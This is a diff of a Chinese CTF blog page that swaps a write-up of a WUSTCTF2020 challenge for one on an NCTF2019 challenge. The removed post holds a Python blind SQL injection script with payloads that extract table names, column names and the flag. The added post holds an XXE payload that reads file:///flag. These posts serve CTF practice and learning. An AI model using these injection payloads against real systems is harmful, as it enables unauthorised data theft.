@@ -3,7 +3,7 @@
   <head>
      
     <meta charset="UTF-8">
-    <title>&lt;WUSTCTF2020&gt;颜值成绩查询 - d0ud</title>
+    <title>&lt;NCTF2019&gt;Fake XML cookbook - d0ud</title>
     <link rel="shortcut icon" href="/static/img/icon.png">
     <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
     
@@ -15,7 +15,7 @@
 
     <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
     <meta property="og:site_name" content="d0ud">
-    <meta property="og:title" content="&lt;WUSTCTF2020&gt;颜值成绩查询"/>
+    <meta property="og:title" content="&lt;NCTF2019&gt;Fake XML cookbook"/>
     
     <style>body:before{ content: ''; background-image: url(https://null-d0ud.github.io/img/bgg.png) }</style>
     
@@ -52,42 +52,36 @@
     <main>
     <div class="wrap min">
         <section class="post-title">
-            <h2>&lt;WUSTCTF2020&gt;颜值成绩查询</h2>
+            <h2>&lt;NCTF2019&gt;Fake XML cookbook</h2>
             <div class="post-meta">
-                <time class="date">2021.11.23</time>
+                <time class="date">2022.04.27</time>
             
-                <span class="category"><a class="category-link" href="/categories/SQL-injection/">SQL injection</a></span>
+                <span class="category"><a class="category-link" href="/categories/xxe/">xxe</a></span>
             
             </div>
         </section>
         <article class="post-content">
         
-            <p>常规布尔盲注，甚至没有什么过滤</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
-
-tar_url<span class="token operator">=</span><span class="token string">"..............."</span>
-par<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"stunum"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>
-an<span class="token operator">=</span><span class="token string">""</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">>"</span></span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token comment">#par["stunum"]=f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))=&#123;w&#125;)"</span>
-        <span class="token comment">#par["stunum"]=f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),&#123;i&#125;,1))=&#123;w&#125;)"</span>
-        <span class="token comment">#par["stunum"]=f"0^(ascii(substr((select(group_concat(value))from(flag)),&#123;i&#125;,1))=&#123;w&#125;)"</span>
-        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>tar_url<span class="token punctuation">,</span>params<span class="token operator">=</span>par<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
-            an<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>an<span class="token punctuation">)</span>
-            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+            <p>首先从题目名字已经很明显了，就是XXE，打开题目是登录界面，抓包，发现回显的数据是提交的用户名，对用户名进行外部实体声明，最终发现<code>flag</code>就在根目录下</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY b SYSTEM "file:///flag">
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>
+<span class="token entity named-entity" title="&b;">&amp;b;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
         </article>
         <section class="post-near">
             <ul>
                 
-                    <li>上一篇: <a href="/%5BRCTF2015%5DEasySQL/">&lt;RCTF2015&gt;EasySQL</a></li>
+                    <li>上一篇: 看完啦 (つд⊂)</li>
                 
                 
-                    <li>下一篇: <a href="/GYCTF2020Ezsqli/">&lt;GYCTF2020&gt;Ezsqli</a></li>
+                    <li>下一篇: <a href="/%5BSUCTF%202019%5DPythonginx/">&lt;SUCTF 2019&gt;Pythonginx</a></li>
                 
             </ul>
         </section>
